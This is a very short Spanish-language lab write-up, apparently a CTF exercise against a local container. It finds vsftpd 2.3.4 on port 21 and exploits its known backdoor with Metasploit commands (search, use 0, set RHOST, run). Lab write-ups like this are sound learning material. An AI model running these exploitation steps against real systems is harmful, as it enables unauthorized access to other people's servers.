## Reconocimiento:

Puerto 21 : ftp

Tenemos una versión vulnerable ( vsftpd 2.3.4 )

```bash
msfconsole -q
search vsftpd 2.3.4
```

Encontramos un backdoor

```bash
use 0
set RHOST 172.17.0.2
run
```

Y listo
